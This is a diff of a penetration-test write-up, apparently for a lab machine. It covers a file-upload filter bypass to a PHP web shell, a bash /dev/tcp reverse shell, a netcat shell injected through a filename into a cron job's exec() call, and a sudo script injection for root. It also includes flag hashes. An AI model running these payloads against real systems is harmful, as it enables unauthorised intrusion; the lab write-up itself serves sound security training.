@@ -1,4 +1,4 @@
-Start: 2026-10-02, 11:15
+ Start: 2026-10-02, 11:15
 
 IP:
 ```
@@ -12,7 +12,7 @@ ports
 sudo nmap -p- -Pn -n --min-rate=5000 -vv 10.129.65.225 -oG network/nmap_ports.txt
 ```
 
-01
+![](screenshots/01.png)
 
 22 SSH
 80 HTTP
@@ -24,7 +24,7 @@ service
 sudo nmap -sCV -p22,80,443 -vv --min-rate=5000 10.129.65.225 -oN network/nmap_service.txt
 ```
 
-02
+![](screenshots/02.png)
 
 OpenSSH 7.4
 Apache 2.4.6
@@ -35,7 +35,7 @@ HTTP - 80
 
 Browsing: http://10.129.65.225/
 
-03
+![](screenshots/03.png)
 
 New "FaceMash", etc
 
@@ -45,13 +45,13 @@ Fuzzing
 ffuf -u http://10.129.65.225/FUZZ -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 ```
 
-04
+![](screenshots/04.png)
 
 backup, uploads
 
 Browsing /backups
 
-05
+![](screenshots/05.png)
 
 Download `backup.tar`
 
@@ -59,7 +59,7 @@ Download `backup.tar`
 tar -xvf backup.tar
 ```
 
-06
+![](screenshots/06.png)
 
 Source code
 
@@ -67,13 +67,13 @@ Browsing uploads shows only a dot (.)
 
 Browsing `photos.php`
 
-07
+![](screenshots/07.png)
 
-Galery of uploaded photos
+Gallery of uploaded photos
 
 Looking at upload.php code
 
-08
+![](screenshots/08.png)
 
 It filters out any file bigger than 60000 bytes and/or with filename different than `*.jpg/png/gif/jpeg`
 
@@ -91,7 +91,7 @@ Trying to upload "Invalid"
 
 After trying different bypasses, uploaded the file
 
-09
+![](screenshots/09.png)
 
 Uploading again using one filter at a time see that the double extension/null byte in filename and magic byte in content can bypass the filter
 
@@ -105,19 +105,19 @@ GIF magic byte
 GIF89a
 ```
 
-10
+![](screenshots/10.png)
 
 Without magic byte
 
-11
+![](screenshots/11.png)
 
 Browsing photos.php
 
-12
+![](screenshots/12.png)
 
 Ctrl + U
 
-13
+![](screenshots/13.png)
 
 Click on any of the uploaded malicious PHP files
 Enter the cmd parameter and command. (the code changes file name to client IP)
@@ -126,14 +126,14 @@ Enter the cmd parameter and command. (the code changes file name to client IP)
 view-source:http://10.129.65.225/uploads/10_10_14_204.php.gif?cmd=id
 ```
 
-14
+![](screenshots/14.png)
 
-RCE as apache
+RCE as `apache`
 
 Reverse shell
 
-bash -c 'bash -i &> /dev/tcp/10.10.14.204/9001 0>&1' 
-bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.204/9001+0>%261'
+`bash -c 'bash -i &> /dev/tcp/10.10.14.204/9001 0>&1'`
+`bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.204/9001+0>%261'`
 
 ```
 view-source:http://10.129.65.225/uploads/10_10_14_204.php.gif?cmd=bash+-c+%27bash+-i+%26%3E+/dev/tcp/10.10.14.204/9001+0%3E%261%27
@@ -145,19 +145,19 @@ Set listener
 nc -nlvp 9001
 ```
 
-15
+![](screenshots/15.png)
 
 Connected as `apache`
 
 See user `guly`. `/home/guly`
 
-16
+![](screenshots/16.png)
 
 Cant read `user.txt`
 
 Can read `check_attack.php` and `crontab.guly`. Copy to local system to read better.
 
-17
+![](screenshots/17.png)
 
 The script sends checks for malicious files and removes them. Path (`$path`) is the uploads path, then includes the filename (`$value`) ,which attacker controls, on a system execution sink (`exec()`). The script executes the commands if the filename does not follow the pattern name seen previously (`10_10_10_10.*`). The script executes periodically by set cron job (`crontab.guly`).
 
@@ -181,13 +181,13 @@ Filename
 ;nc -c bash 10.10.14.204 9001
 ```
 
-18
+![](screenshots/18.png)
 
 After a moment, a minute
 
-19
+![](screenshots/19.png)
 
-Shell as guly
+Shell as `guly`
 user.txt: `ea641be107e8e07d315e57ae3966c21d`
 
 End: 2026-10-02, 13:40
@@ -202,11 +202,11 @@ Enumerating sudo privileges
 sudo -l
 ```
 
-20
+![](screenshots/20.png)
 
 guly is allowed to run `/usr/local/sbin/changename.sh` as root without a password required
 
-21
+![](screenshots/21.png)
 
 The script is editing variables for an interface (`guly0`) configuration `/etc/sysconfig/network-scripts/ifcfg-guly` and turning the interface up. It filters out with a regex.
 
@@ -221,7 +221,7 @@ sudo /usr/local/sbin/changename.sh
 
 Input ` bash` in any of the variables.
 
-22
+![](screenshots/22.png)
 
 Shell as root
 root.txt: `2d07ed3372ad26cb7612ee51537ab9ed`
